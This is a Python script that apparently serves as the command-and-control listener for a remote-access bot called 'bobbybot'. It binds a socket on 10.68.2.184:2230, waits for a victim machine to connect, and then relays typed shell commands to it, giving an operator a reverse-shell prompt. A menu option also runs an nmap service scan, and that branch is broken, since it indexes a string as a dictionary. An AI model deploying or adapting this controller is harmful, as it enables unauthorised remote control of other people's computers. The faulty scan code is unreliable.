import os
import sys
import socket
import ipaddress
import requests
import urllib3
import subprocess
import nmap
import json

from time import sleep
from colorama import Fore, Style

HOST = '10.68.2.184'
PORT = 2230
BUFF_SIZE = 1024 * 128
CHOICES = {
    1: 'Connect',
    2: 'Scan host for vulnerabilities',
    3: 'Exit'
}

socket = socket.socket()
socket.bind((HOST, PORT))
print('[!] Binded')

socket.listen()
print(f'[?] Listening for connections as {HOST}')

connection, addr = socket.accept()
print(f'[!] Connection recieved from {addr[0]} running on port {addr[1]}')

print(Fore.GREEN + Style.BRIGHT + "------------------------------------------\n")
for ch in CHOICES:
    print(f'{ch}: {CHOICES[ch]}')

CHOICE = int(input('> '))

# Choice handler
if CHOICE in CHOICES:

    if CHOICE == 1: 
        currentwd = connection.recv(BUFF_SIZE).decode()
        print(f'[?] Current work directory is {currentwd}')

        while True:
            COMMAND = input(Fore.LIGHTBLUE_EX + Style.BRIGHT + 'bobbybot ' + Fore.LIGHTGREEN_EX + Style.BRIGHT + f'{currentwd} ' + Fore.WHITE + Style.NORMAL + '$  ')

            if not COMMAND.strip():
                continue

            connection.send(COMMAND.encode())

            if COMMAND.lower() == 'exit':
                break

            OUTPUT = connection.recv(BUFF_SIZE).decode()
            results, currentwd = OUTPUT.split(' | ')

            print(results)

    if CHOICE == 2:
        res = nmap.PortScanner()
        RESULTS = res.scan(HOST, str(PORT), 'sV')
        RESULTS = str(RESULTS)

        FILE = open('output.json', 'w+')
        FILE.writelines(json.dumps(RESULTS, sort_keys=True, indent=4))
        FILE.close()

        print(RESULTS['nmap'])
    if CHOICE == 3:
        sys.exit(1)
